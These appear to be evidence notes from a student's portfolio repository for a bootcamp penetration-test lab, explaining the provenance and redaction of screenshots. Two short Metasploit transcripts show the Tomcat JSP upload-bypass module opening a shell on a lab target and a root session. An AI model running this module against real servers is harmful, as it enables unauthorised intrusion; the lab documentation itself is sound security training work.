# Evidence notes

## Source report

My source document is **“LeVonta Rekall Penetration Test Report,”** created in August 2024 and last updated in September 2024. Its document history lists me as the final-draft author, and it contains the screenshots used here. I have kept the full report out of this public repo because it includes passwords, hashes, and course flags.

The report calls me “Lead Penetration Tester” at “Quantum Security LLC.” Those were roles in the class scenario, not a job or a client.

A separate inventory of 117 recovered bootcamp images helped sort Rekall evidence from unrelated Splunk, Azure WAF, Windows policy, and MegaCorp work. That inventory and the original images remain outside this repo.

## Tomcat captures

The [published session image](../evidence/exploitation/tomcat-root-shell-sanitized.png) is a cropped, redacted **visual derivative** of a screenshot embedded in my report. I checked its visible commands and output against the source. It is not a byte-for-byte copy. The connection details and everything after the `pwd` result were removed.

The report also contains an earlier exploit capture. Here are the relevant lines, transcribed with lab identifiers replaced by brackets:

```text
msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > set RHOST [LAB_TARGET]
msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > run
[*] Uploading payload
[*] Payload executed!
[*] Command shell session 1 opened ([LAB_CONNECTION])
```

The published image shows a later **session 2**:

```text
msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > sessions -i 2
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/usr/local/tomcat
```

The two session numbers differ. I use the first capture as evidence that the module opened a shell and the second as evidence of an active root session. I do not treat them as proof of one continuous run.

The [Nmap](../evidence/reconnaissance/01-nmap-service-enumeration-sanitized.png) and [Nessus](../evidence/reconnaissance/02-nessus-critical-vulnerability-sanitized.png) images were published earlier. The Nmap image still shows private lab addresses. No public image here shows a Struts exploit, a completed fix, or a retest.
